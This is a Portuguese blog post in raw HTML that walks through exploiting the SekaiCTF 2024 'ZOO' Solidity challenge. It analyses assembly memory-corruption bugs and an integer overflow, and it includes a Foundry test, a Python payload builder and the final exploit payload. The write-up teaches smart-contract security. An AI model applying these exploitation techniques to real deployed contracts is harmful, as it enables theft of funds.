<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>SekaiCTF 2024 writeup: Blockchain/ZOO | Blog do GRIS</title>
<meta name=keywords content><meta name=description content="Writeup de um desafio de blockchain do SekaiCTF 2024."><meta name=author content="ottoboni"><link rel=canonical href=http://localhost:1313/blog/2024-08-25-sekaictf-zoo/><meta name=google-site-verification content="G-YWN8S4BKK0"><link crossorigin=anonymous href=/assets/css/stylesheet.45e028aa8ce0961349adf411b013ee39406be2c0bc80d4ea3fc04555f7f4611a.css integrity="sha256-ReAoqozglhNJrfQRsBPuOUBr4sC8gNTqP8BFVff0YRo=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/blog/2024-08-25-sekaictf-zoo/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css integrity=sha384-MlJdn/WNKDGXveldHDdyRP1R4CTHr3FeuDNfhsLPYrq2t0UBkUdK2jyTnXPEK1NQ crossorigin=anonymous><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js integrity=sha384-VQ8d8WVFw0yHhCk5E8I86oOhv48xLpnDZx5T9GogA/Y84DcCKWXDmSDfn13bzFZY crossorigin=anonymous></script><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js integrity=sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR crossorigin=anonymous onload=renderMathInElement(document.body)></script>>
<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><meta property="og:url" content="http://localhost:1313/blog/2024-08-25-sekaictf-zoo/"><meta property="og:site_name" content="Blog do GRIS"><meta property="og:title" content="SekaiCTF 2024 writeup: Blockchain/ZOO"><meta property="og:description" content="Writeup de um desafio de blockchain do SekaiCTF 2024."><meta property="og:locale" content="pt"><meta property="og:type" content="article"><meta property="article:section" content="blog"><meta property="article:published_time" content="2024-09-02T00:00:00+00:00"><meta property="article:modified_time" content="2024-09-02T00:00:00+00:00"><meta property="og:image" content="http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="SekaiCTF 2024 writeup: Blockchain/ZOO"><meta name=twitter:description content="Writeup de um desafio de blockchain do SekaiCTF 2024."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Blogs","item":"http://localhost:1313/blog/"},{"@type":"ListItem","position":2,"name":"SekaiCTF 2024 writeup: Blockchain/ZOO","item":"http://localhost:1313/blog/2024-08-25-sekaictf-zoo/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"SekaiCTF 2024 writeup: Blockchain/ZOO","name":"SekaiCTF 2024 writeup: Blockchain\/ZOO","description":"Writeup de um desafio de blockchain do SekaiCTF 2024.","keywords":[],"articleBody":"O desafio Autor: snwo Descrição: Welcome to assembly zoo Análise inicial Dando uma olhada no contrato de setup, vemos que o objetivo final é setar a variável isSolved no contrato ZOO para 1.\n1 2 3 4 5 6 7 8 9 10 11 contract Setup { ZOO public immutable zoo; constructor() payable { zoo = new ZOO(); } function isSolved() public view returns (bool) { return zoo.isSolved() == 1; } } Logo de cara, ZOO tem alguns pontos interessantes. Esse contrato implementa Pausable e chama a função _pause no final do construtor. Usando a documentação, vemos que isso é um mecanismos pra habilitar/desabilitar funções do contrato. Quando pausado, funções marcadas com o modificador whenNotPaused chamam revert ao serem chamadas.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import {Animal} from \"./Animal.sol\"; import {Pausable} from \"@openzeppelin/contracts/utils/Pausable.sol\"; contract ZOO is Pausable { uint256 public isSolved; AnimalWrapper[] public animals; \u003csnip\u003e constructor() { \u003csnip\u003e // The ZOO is not opened yet :( _pause(); } \u003csnip\u003e Seguindo a diante, esbarramos na função commit, que usa esse modificador. Essa função também tem a peculiaridade de ser escrita completamente em assembly. Ok… Vamos ignorar ela por enquanto, mas aparentemente a gente tem que despausar o contrato pra chegar nela.\n1 2 3 4 5 function commit(bytes memory data) internal whenNotPaused { assembly { } } Por fim, temos uma função fallback. Essa função é especial (por isso não precisa da keyword function) e é chamada quando a assinatura especificada no calldata não existe. Basicamente, é a função que é chamada quando você chama uma função que não existe. Pra nossa infelicidade, basicamente tudo é escrito em assembly, e não é pouco código não. Vamos analisar o que não está em assembly então:\nA função aceita bytes como argumento. Esses bytes são na verdade a calldata enviada para a função. Temos um array de function(bytes memory) chamado functions. O único elemento desse array é a função commit que vimos antes. commit é então chamada a partir desse array no final da função 1 2 3 4 5 6 7 8 9 10 11 12 fallback() external payable { function(bytes memory)[] memory functions = new function( bytes memory )[](1); functions[0] = commit; bytes memory local_animals; assembly { } functions[0](local_animals); } Se você já tem alguma experiência com desafios de pwn, esse array functions tá quase que gritando “ME CORROMPA POR FAVOR”. A única razão lógica pra chamar a função usando o array é justamente pra você conseguir corromper o endereço. O código não foi escrito assim por acaso. O fato de o que vem logo depois estar em assembly (único lugar que bugs de memória podem acontecer em Solidity) só enfatiza isso. Nesse contexto, sem nem ler o assembly nem nada, o caminho já tá mais ou menos claro: deve ter algum bug no assembly que me permite sobrescrever o array. Sobrescrevendo o array, a gente provavelmente consegue pular direto pra commit e bypassar o whenNotPaused. O que a gente faz quando chegar lá? Menor ideia, um problema de cada vez.\nDito isso, hora de sofrer tentando entender o assembly. Mas, antes disso, vamos entender um pouco sobre como assembly em Solidity funciona.\nYul Todo código que roda na Ethereum Virtual Machine (EVM) tem que ser compilado para bytecode da EVM. Como o nome diz, a EVM é uma máquina virtual e tem sua própria arquitetura, exatamente como x86 e ARM. Como toda arquitetura, a EVM tem instruções e essas instruções podem ser representadas mais facilmente a partir de assembly. Uma curiosidade interessante é que todos os opcodes da EVM ocupam exatamente 1 byte. Elegante, né?\nBom, você pode escrever código pra EVM instrução por instrução, mas felizmente isso não é necessário. Esses blocos assembly usados em Solidity na verdade aceitam uma linguagem chamada Yul, que é tipo um assembly turbinado. Em Yul, você chama as instruções normalmente, mas também existem loops, condicionais e variáveis. Isso facilita bastante e meio que abstrai a arquitetura de pilha da EVM. Você ainda consegue acessar as instruções diretamente, mas aquela parte mais chata e repetitiva de escrever assembly é feita pra você.\nComo funciona a memória de um contrato na EVM Primeiro de tudo, um ponto super importante: a EVM é uma máquina de 256 bits. Sendo assim, a stack tem entradas de 32 bytes e os endereços ocupam 32 bytes. Não é à toa que uint e uint256 são sinônimos em Solidity: basicamente tudo é feito de 32 em 32 bytes.\nOutro fato interessante é que a memória de um contrato começa em 0. Conforme o contrato vai usando memória, ela vai sendo expandida (e isso custa gas).\nTemos também que as quatro primeiras words (word = 32 bytes) são reservadas e têm usos específicos. Nessa lógica, o espaço livre pro contrato fazer o que quiser começa em 0x80.\n1 2 3 4 0x00 -\u003e scratch 0x20 -\u003e scratch 0x40 -\u003e free memory pointer 0x60 -\u003e zero Dessas words reservadas, a mais importante é a terceira (fica em 0x40). Nesse espaço fica o free memory pointer. Esse ponteiro aponta pra onde tem memória livre. Dessa forma, sempre que o programa precisa armazenar alguma coisa na memória, ele armazena no local onde esse ponteiro aponta e então move o ponteiro adiante pra algum lugar livre.\nCom todo esse contexto explicado, vamos partir pra análise do assembly.\nA função fallback Primeiro a função usa mload pra pegar um endereço disponível no free memory pointer. Em seguida, armazena o tamanho e o conteúdo da calldata nesse espaço. Lembrando aqui que a calldata nesse contexto é exatamente a mesma coisa que o argumento passado pra função.\n1 2 3 4 5 6 7 8 9 10 11 // armazena calldatasize let arr := mload(0x40) let size := calldatasize() mstore(arr, size) // move e alinha free memory pointer let size_align := add(add(size, sub(0x20, mod(size, 0x20))), 0x20) mstore(0x40, add(arr, size_align)) // armazena calldata calldatacopy(add(arr, 0x20), 0, size) Em seguida, aquela variável de fora do assembly, local_animals, é alocada em um espaço de 0x120 bytes.\n1 2 local_animals := mload(0x40) mstore(0x40, add(local_animals, 0x120)) Temos então um loop pra iterar cada byte da calldata. Em seguida, o primeiro byte da calldata é lido e salvo em op. Essa sequência de mload shr add vai se repetir bastante.\nA variável op é então usada em um switch. Com isso, podemos ver que o que o assembly faz é basicamente ler instruções passadas via calldata, sendo o primeiro byte qual instrução queremos chamar.\n1 2 3 4 5 6 7 8 9 10 11 12 13 for { let i := 0 } lt(i, size) { let op := mload(add(add(arr, 0x20), i)) op := shr(0xf8, op) i := add(i, 1) switch op case 0x10 { \u003csnip\u003e } case 0x20 { \u003csnip\u003e } case 0x30 { \u003csnip\u003e } } { Vamos analisar em seguida as operações 0x10 e 0x20. A 0x30 será ignorada porque não foi usada na solução desse chall. Ainda assim, foram postadas soluções diferentes no Discord do CTF que usam essa instrução.\nOperação 0x10 - Add animal O próximo byte da calldata é armazenado em idx. Pelo nome, já vemos que isso vai ser um índice. Em seguida, o código checa se o índice é maior que 7. Se for, a transação falha.\n1 2 3 4 5 6 7 let idx := mload(add(add(arr, 0x20), i)) idx := shr(0xf8, idx) i := add(i, 1) if gt(idx, 7) { revert(0, 0) } Os próximos 4 bytes são pra name_length e animal_index, cada um com 2 bytes.\n1 2 3 4 5 6 7 let name_length := mload(add(add(arr, 0x20), i)) name_length := shr(0xf0, name_length) i := add(i, 2) let animal_index := mload(add(add(arr, 0x20), i)) animal_index := shr(0xf0, animal_index) i := add(i, 2) O código segue pra alocar um espaço e o chama de temp. Na primeira word, animal_index é armazenado.\n1 2 let temp := mload(0x40) mstore(temp, animal_index) Temos em seguida um mcopy que copia os próximos name_length bytes da calldata pra terceira word de temp.\n1 2 mcopy(add(temp, 0x40), add(add(arr, 0x20), i), name_length) i := add(i, name_length) O valor em name_length é então alinhado e armazenado na segunda word de temp.\n1 2 3 4 5 name_length := add( name_length, sub(0x20, mod(name_length, 0x20)) ) mstore(add(temp, 0x20), name_length) Agora que animal_index, name_length e name foram escritos na memória, o free memory pointer é atualizado pra apontar pra logo depois deles.\n1 mstore(0x40, add(temp, add(name_length, 0x40))) O endereço de temp segue para ser armazenado em (local_animals + 0x20) + (idx * 0x20). Com isso, vemos que local_animals é na verdade um array, com o endereço de seus elementos começando em + 0x20.\n1 mstore(add(add(local_animals, 0x20), mul(0x20, idx)), temp) Por fim, vemos que a primeira word de local_animals é o tamanho do array.\n1 2 let animals_count := mload(local_animals) mstore(local_animals, add(animals_count, 1)) Vamos desenhar o que acabamos de descobrir então. Abaixo temos o layout do array:\n1 2 3 4 5 6 +0x000 tamanho do array \u003c---- local_animals aponta pra cá +0x020 endereço do elemento 0 +0x040 endereço do elemento 1 +0x060 endereço do elemento 2 ... +0x100 endereço do elemento 7 E abaixo temos o layout de um dos elementos. Note que animal_index e name_length são lidos como números de 2 bytes da calldata, mas armazenados como números de 32 bytes:\n1 2 3 +0x00 animal_index \u003c---- (local_animals + 0x20)[n] aponta pra cá +0x20 name_length +0x40 name (tamanho variável) Conclusão: a operação 0x10 recebe os argumentos idx, animal_index, name_length e name da calldata, aloca e preenche um animal com esses valores, e adiciona ele no array local_animals no índice idx.\nOperação 0x20 - Edit animal Entrando no case da operação 0x20, temos o mesmo início da operação anterior: o primeiro byte vai para o idx (que não pode ser maior que 7).\nO resto do case pega o próximo byte e o chama de edit_type. Em seguida, temos um outro switch que se separa em dois valores para edit_type: 0x21 e 0x22. Não vamos falar sobre o 0x22, pois ele não foi utilizado na solução.\nQuando edit_type é 0x21, o contrato lê 2 bytes para name_length e em seguida copia os name_length bytes seguintes pra sobrescrever o name do animal sendo editado.\nO ponto mais interessante aqui é que o name_length anterior não é verificado, então podemos editar um animal com um name maior que o anterior, ou seja, um overflow para o animal de baixo.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 let edit_type := mload(add(add(arr, 0x20), i)) edit_type := shr(0xf8, edit_type) i := add(i, 1) switch edit_type case 0x21 { let name_length := mload(add(add(arr, 0x20), i)) name_length := shr(0xf0, name_length) i := add(i, 2) mcopy( add(temp, 0x40), add(add(arr, 0x20), i), name_length ) } Sobrescrevendo o array functions Fazendo esse desafio, eu demorei bastante tempo pra pensar numa forma de sobrescrever o array functions. Afinal, o overflow que encontramos na edição de animais simplesmente não alcança o array, porque ele vem antes dos animais.\nPra entender melhor onde as coisas se situam na memória, podemos usar o debugger do foundry. Pra isso, basta criar um projeto novo com forge init e criar um teste. Como teste, vamos criar um animal com:\nidx = 0x00 name_length = 0x0005 index = 0xaabb name = 0x1122334455 Com a análise da função fallback que fizemos, vemos que basta mandar essa sequência de bytes: 10000005aabb1122334455. Dessa forma, nosso contrato só precisa chamar fallback e passar esses bytes como argumento. Como fallback na verdade não é exatamente uma função, temos que usar call e passar nossos bytes pra ele.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 import {Test, console} from \"forge-std/Test.sol\"; import {ZOO} from \"../src/ZOO.sol\"; contract ZOOTest is Test { ZOO public zoo; function setUp() public { zoo = new ZOO(); } function test_bypass_pause() public { bytes memory b = hex\"10000005aabb1122334455\"; (bool success, bytes memory ret) = address(zoo).call(b); if (!success) { if (ret.length \u003e 0) { assembly { let size := mload(ret) revert(add(0x20, ret), size) } } else { revert(\"Revert without reason\"); } } if (zoo.isSolved() == 1) { console.log(\"Success\"); } else { console.log(\"Fail\"); } } } Se rodarmos o teste, vemos que ele falhou porque a função EnforcedPause() foi chamada. Isso é esperado, já que commit foi chamada normalmente e o contrato estava pausado, como vimos antes.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 $ forge test -vv [⠊] Compiling... No files changed, compilation skipped Ran 1 test for test/ZOO.t.sol:ZOOTest [FAIL. Reason: EnforcedPause()] test_bypass_pause() (gas: 8506) Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 933.39µs (64.20µs CPU time) Ran 1 test suite in 5.14ms (933.39µs CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests) Failing tests: Encountered 1 failing test in test/ZOO.t.sol:ZOOTest [FAIL. Reason: EnforcedPause()] test_bypass_pause() (gas: 8506) Encountered a total of 1 failing tests, 0 tests succeeded Pra debugar, é só mudar o comando pra forge test --debug test_bypass_pause. Isso vai abrir o debugger do foundry, que nos permite executar o programa passo a passo e ver o que exatamente tá na memória.\nAbaixo eu parei o programa logo depois do mstore que incrementa animals_count na hora de adicionar o animal. A overview da memória que o foundry mostra é meio assustura a princípio por conta da quantidade de números em cada linha, mas a lógica é exatamente a mesma do que você veria debugando x64. A diferença é que ao invés de 8 bytes por linha, são 32.\nNa screenshot, basicamente tudo que o programa fez está marcado. Dessa forma, fica fácil de ver que o overflow na hora de editar um animal não serviria pra sobrescrever functions, porque esse array fica bem antes de onde os animais ficam.\nUsando animais não inicializados como trampolim pra bypassar o whenNotPaused Na screenshot do debugger que vimos, chama atenção o fato de quase todo o array de animais estar zerado. Isso acontece porque só adicionamos um animal no índice 0, os outros índices ficam zerados por padrão, sem serem inicializados.\nNa verdade, o código nunca checa de fato se um animal foi inicializado antes de acessá-lo. O que aconteceria então se editássemos um animal que não foi inicializado? Usando a screenshot como base, o segundo animal não foi inicializado. Se passarmos idx=0x01, temp será o endereço desse animal, no caso o endereço que é todo zeros.\n1 2 let offset := add(add(local_animals, 0x20), mul(0x20, idx)) // isso seria 0x0140 let temp := mload(offset) // isso seria 0 Na hora de copiar o nome, ele será copiado para 0x00 + 0x40, que é 0x40, o free memory pointer.\n1 2 3 4 5 mcopy( add(temp, 0x40), // como temp=0, isso seria 0x40 add(add(arr, 0x20), i), name_length ) Dessa forma, conseguimos escrever qualquer coisa de 0x40 pra baixo, incluindo 0xa0, que é onde o endereço da commit fica. Ainda assim, temos algumas questões a resolver, porque somos obrigados a escrever por cima de outros valores para chegar em 0xa0. Vamos revisar eles um a um:\n0x40 - Esse é o free memory pointer. Intuitivamente, podemos escrever aqui qualquer coisa maior (mas não MUITO maior) ou igual ao valor original que tudo deve dar certo. 0x60 - Esse endereço é na verdade sempre zerado. Podemos simplesmente escrever zero aqui então. 0x80 - Esse é o tamanho do array functions. Só escrever 0x01 aqui pra não mudar nada. Sem problemas então, já sabemos o que escrever em cada endereço antes de chegar em 0x0a.\nAgora a questão é, o que escrever em 0x0a? Com o debugger, podemos ver que o endereço que estava originalmente lá vai para a função whenNotPaused, do contrato Pausable. A primeira linha chama _requireNotPaused, que é a função que chama revert se o contrato estiver pausado. Basta então pular para onde essa função retornaria. Usando o debugger, fica fácil ver que esse endereço é 0x0323.\nFinalmente, podemos montar nosso payload pra bypassar o whenNotPaused.\n0x20 (1 byte), pra editar um animal. 0x07 (1 byte), pra escolher o último índice (poderia ser qualquer um). 0x21 (1 byte), pra escolher o edit_type. 0x80 (2 bytes), porque vamos escrever 128 bytes. 0xffff (32 bytes), pra sobrescrever o free memory pointer. 0x00 (32 bytes), pra sobrescrever o endereço que sempre tem zeros. 0x01 (32 bytes), pra sobrescrever o tamanho do array functions. 0x0323 (32 bytes), que é o endereço pra onde queremos pular. Payload: 2007210080000000000000000000000000000000000000000000000000000000000000ffff000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000323\nDepois de atualizar o contrato teste com esse payload e rodar o teste, vemos que agora não temos mais o erro dizendo que o contrato tá pausado.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ forge test -vv [⠊] Compiling... [⠊] Compiling 1 files with Solc 0.8.25 [⠒] Solc 0.8.25 finished in 931.41ms Compiler run successful! Ran 1 test for test/ZOO.t.sol:ZOOTest [PASS] test_bypass_pause() (gas: 12362) Logs: Fail Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 9.39ms (8.61ms CPU time) Ran 1 test suite in 9.84ms (9.39ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests) Com o debugger, também é possível verificar que o valor foi sobrescrito e que agora o contrato está entrando na função commit.\nObjetivo final = sstore(1,1) Ótimo, conseguimos com sucesso bypassar o WhenNotPaused. E agora? Agora a gente tem que descobrir uma forma de sobrescrever a variável isSolved. Pra isso, vamos revisar como ela foi declarada primeiro:\n1 2 3 4 contract ZOO is Pausable { uint256 public isSolved; } Essa variável não está na memória, ela pertence ao contrato em si e é armazenada na própria blockchain. Variáveis desse tipo ficam armazenadas no que chamam de storage. Pra interagir com essas variáveis, temos as instruções sload e sstore. A primeira pra ler e a segunda pra escrever. Cada uma dessas variáveis fica armazenada em um slot, que é referenciado usando um número de 32 bytes. Nos casos mais simples, tipo de um simples uint256, o número do slot simplesmente vai incrementando de 1 em 1 a partir do zero (a primeira variável ficaria no slot 0, a segunda no 1 e assim por diante), mas tem uns casos mais enrolados em que não é tão simples assim.\nEnfim, esse caso é simples e isSolved fica no slot 1. Não é no 0 porque na verdade tem uma variável escondida que armazena se o contrato está pausado ou não meio que implícita. Precisamos então setar a variável no slot 1 para 1. Isso seria sstore(1,1) em assembly.\nVamos então analisar o assembly da commit e ver como isso poderia ser possível. Relaxa que essa é menor que a fallback.\nA função commit Primeiro vamos lembrar que o único argumento dessa função se chama data e é aquele array que a fallback constrói. Sendo um array, a primeira coisa que a função faz é loopar cada elemento dele. De agora em diante todos os trechos serão uma iteração desse loop.\n1 2 3 4 5 6 7 8 9 10 let counter := 0 let length := mload(data) for { let i := 0 } lt(i, length) { i := add(i, 1) } { \u003csnip\u003e } Dentro do loop, o index e name_length do animal são lidos. Detalhe que nessa função o index do animal é chamado de idx, o que tinha um significado diferente na outra função. Meio confuso, mas não fui eu que escrevi o código.\n1 2 3 4 5 6 7 8 9 10 let idx let name let memPtr := mload(0x40) let ptr := mload(add(add(data, 0x20), counter)) idx := mload(ptr) name := add(ptr, 0x20) let name_length := mload(name) counter := add(counter, 0x20) Agora eu vou pular umas boas linhas de código que não fazem nada de relevante pra solução e ir direto ao ponto. Atenção aqui que esse é o pulo do gato. Temos uma varíavel slot_hash, que é o hash de um trecho de memória. Aqui o valor da variável não é super importante, só é importante saber que é um número previsível.\nTemos também uma variável animal_counter, que é lida do storage usando sload. O slot do qual essa variável é lida depende de idx, um valor que a gente controla. O ponto importante aqui é que se sload recebe um slot nada a ver, que não tem nada, ele retorna 0.\n1 2 let slot_hash := keccak256(0x00, 0x20); let animal_counter := sload(add(add(slot_hash, mul(2, idx)), 1)) Por fim, temos o tão esperado sstore. Só precisamos transformar os dois números que ele recebe em 1 e o chall está resolvido. O segundo argumento é fácil, praticamente qualquer valor de idx vai fazer com que animal_counter seja 0, e 0+1=1, QED. O primeiro argumento é um pouco (muito) mais enrolado, mas a gente chega lá.\n1 2 3 4 sstore( add(add(slot_hash, mul(2, idx)), 1), add(animal_counter, 1) ) Primeiro de tudo, a gente realmente controla idx? Esse número é aquele primeiro campo que cada animal tem, e se você lembrar bem ele é armazenado em 32 bytes, mas a função fallback na verdade só aceita números de 2 bytes pra esse valor. Isso quer dizer que normalmente 0 \u003c= idx \u003c 2^16, o que simplesmente não vai funcionar. Pra gente transformar aquele primeiro argumento em 1, com certeza precisamos controlar os 32 bytes do idx.\nEm busca dos outros 30 bytes de idx Precisamos de uma forma de escrever um número qualquer de 32 bytes no idx de um animal. Tendo como base o caminho tomado até agora, a primeira maneira de fazer isso que veio à minha cabeça seria usar o overflow na operação de edição do nome do animal.\nPor exemplo, uma forma seria criar dois animais e depois editar o nome do primeiro com um nome mais longo que o original, sobrescrevendo o que vem logo depois, que seria o idx do segundo animal. Não tem nada de errado com essa lógica, mas essa ideia não funciona. Não funciona porque a parte do código que edita o animal tem um bug que não permite que você chame a operação de edição mais de uma vez. Se você reparar, depois do mcopy, o valor de i não é incrementado, então as próximas instruções acabam sendo lidas do novo nome do animal. Não sei se o autor do chall esqueceu de incrementar o i ou se isso foi de propósito, mas isso meio que quebra a ideia de usar a edição pra corromper o idx do animal seguinte.\n1 2 3 4 5 6 7 8 9 10 11 12 13 case 0x21 { let name_length := mload(add(add(arr, 0x20), i)) name_length := shr(0xf0, name_length) i := add(i, 2) mcopy( add(temp, 0x40), add(add(arr, 0x20), i), name_length ) // aqui deveria ter um add(i, name_length), mas não tem :( } Outra ideia seria simplesmente aproveitar o overflow que a gente usou pra sobrescrever functions. A gente seguiria corrompendo a memória, até chegar no idx do primeiro animal. Isso também não funciona. Se você revisar o layout da memória que vimos antes, vai reparar que a calldata fica armazenada entre o início de onde conseguimos corromper (0x40) e onde ficaria o idx do primeiro animal (0x220). Isso significa que se o payload aumentar, a distância até onde queremos corromper também aumenta, porque a calldata é o nosso payload. Por conta disso é impossível corromper qualquer coisa que vier depois da calldata usando esse método.\nA solução foi usar um outro overflow que não vimos ainda. No final da operação que adiciona um animal, a variável animals_count é incrementada. Acaba que na verdade não tem nada que verifica se o index onde você está adicionando um animal já está ocupado ou se mais de 8 animais foram criados, então é possível fazer animals_count ter um número bem maior que o tamanho do array. É só sair criando animais que essa variável vai sendo incrementada.\n1 2 let animals_count := mload(local_animals) mstore(local_animals, add(animals_count, 1)) Por que isso é útil? Porque o loop na função commit itera animal_count vezes. A intenção desse loop é iterar cada elemento do array, com cada iteração lendo o endereço de um animal. Se animal_count for maior que o array, o loop vai começar a ler o conteúdo dos animais em si, que a gente controla.\nA ideia então seria criar um animal cujo idx é o endereço do seu próprio nome. Assim, quando o loop vazar do array e chegar no primeiro animal, ele seguiria o ponteiro e acharia que o idx desse animal é o nome que a gente escolheu. Como o nome não tem limite de tamanho, a gente consegue setar ele pra um número de 32 bytes sem problema. A gente só consegue controlar os 4 bytes menos significativos do idx, mas isso não é um problema, porque o endereço que a gente precisa escrever não é um número grande.\nAbaixo é mostrado como a memória fica fazendo isso. Em vermelho temos o array, mas note que animal_count tem o valor 9, que é maior que o tamanho do array. Logo depois do array, temos o primeiro animal, cujo idx é igual ao endereço do seu nome (0x320). No nome, armazenamos o número que queremos que a função commit interprete como o idx de um animal.\nQuando a função commit recebe esse array, ela vai iterando começando com o endereço do animal 0. Como animal_count é 9, ela então passa do array até chegar em 0x2e0. A função interpreta esse número como se fosse o endereço do animal 8, que na verdade nem existe. Seguindo o ponteiro, ela chega em 0x2e0, cujo valor controlamos. Como os primeiros 32 bytes de um animal são seu idx, a função vai achar que 0x320 na verdade é o idx do animal 8.\nMontar esse esquema não é tão complicado quanto parece. Abaixo temos uma função em Python que gera o hexa do primeiro animal. Aqui não tem nada de muito misterioso, simplesmente criamos um animal normalmente com os valores corretos. idx precisa ser o endereço onde o nome vai ficar e o nome vai ser o valor que queremos que o animal 8 tenha como idx. Vamos ver como chegar nesse número em breve.\n1 2 3 4 5 6 7 8 def create_evil_animal(): op = \"10\" idx = \"00\" index = \"0320\" name = \"\" animal = op + idx + f\"{len(name) // 2:04x}\" + index + name return animal Depois disso precisamos criar animais vazios pra incrementar animal_count. A seguinte função faz exatamente isso. Aqui criamos vários animais iguais no mesmo índice e com um nome vazio. O objetivo aqui é realmente só incrementar animal_count, os valores em si não importam muito.\n1 2 3 4 5 6 7 8 def create_empty_animals(n): op = \"10\" idx = \"01\" index = \"eeee\" name = \"\" animal = op + idx + f\"{len(name) // 2:04x}\" + index + name return n * animal O número mágico Agora sim, controlamos todos os 32 bytes de idx. Pra que que servia isso mesmo? Ah sim, temos que setar o primeiro argumento do sstore pra 1.\n1 2 3 4 sstore( add(add(slot_hash, mul(2, idx)), 1), add(animal_counter, 1) ) Temos que achar um número idx tal que slot_hash + (2 * idx) + 1 seja 1. Isso a princípio parece impossível porque a única solução seria idx = 0 com slot_hash = 0, e a gente não controla slot_hash, ele é um número gigante full aleatório. Parece impossível, mas só até você lembrar que estamos no mundo dos computadores, especificamente na EVM, onde 2^256 = 0. Sim, eu estou falando de overflows. Nós vamos transbordar (2^256)-1 e fazer o número dar a volta e cair exatamente em 1.\nA conta é bem tranquila de fazer com a shell do Python. m é o maior número possível na EVM (256 bits) e h é o slot_hash (peguei usando o debugger).\n1 2 3 4 5 6 \u003e\u003e\u003e m = (2**256)-1 \u003e\u003e\u003e h = int(\"405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5ace\",16) \u003e\u003e\u003e (m-h)//2 + 1 43344706377821576760468996987613231211325356002982170351334206299952371618457 \u003e\u003e\u003e hex(_) '0x5fd43c02f6abee0f86a44e719df2622bbeba666f1abf777702c51962ae225299' E assim, 43344706377821576760468996987613231211325356002982170351334206299952371618457 é o nosso número mágico que vai colocar 1 no primeiro argumento do sstore.\nFinalizando Nosso payload final vai ser o seguinte então:\ncreate_evil_animal - Criamos um animal cujo idx é o endereço do seu nome. No nome, colocamos o número mágico. create_empty_animals - Criamos vários animais vazios pra incrementar animal_count. overwrite_ret - Usamos a edição de nome pra sobrescrever o array functions, bypassando o whenNotPaused. O payload é longuinho e fazer tudo na mão seria tedioso, então eu fiz um script pra montar ele bonitinho:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 #!/usr/bin/env python3 def overwrite_ret(): op = \"20\" idx = \"07\" edit = \"21\" free = (30 * \"00\") + \"ffff\" ret = (30 * \"00\") + \"0323\" write = free + (32 * \"00\") + (31 * \"00\" + \"01\") + ret write_len = f\"{len(write) // 2:04x}\" payload = op + idx + edit + write_len + write return payload def create_evil_animal(): op = \"10\" idx = \"00\" index = \"0320\" # número mágico name = \"5fd43c02f6abee0f86a44e719df2622bbeba666f1abf777702c51962ae225299\" animal = op + idx + f\"{len(name) // 2:04x}\" + index + name return animal def create_empty_animals(n): op = \"10\" idx = \"01\" index = \"eeee\" name = \"\" animal = op + idx + f\"{len(name) // 2:04x}\" + index + name return n * animal final = create_evil_animal() + create_empty_animals(8) + overwrite_ret() print(final) Rodando esse script obtemos:\n1 1000002003205fd43c02f6abee0f86a44e719df2622bbeba666f1abf777702c51962ae22529910010000eeee10010000eeee10010000eeee10010000eeee10010000eeee10010000eeee10010000eeee10010000eeee2007210080000000000000000000000000000000000000000000000000000000000000ffff000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000323 Colocando esse valor no nosso contrato de testes, vemos que deu tudo certo e isSolved foi setado pra 1 como 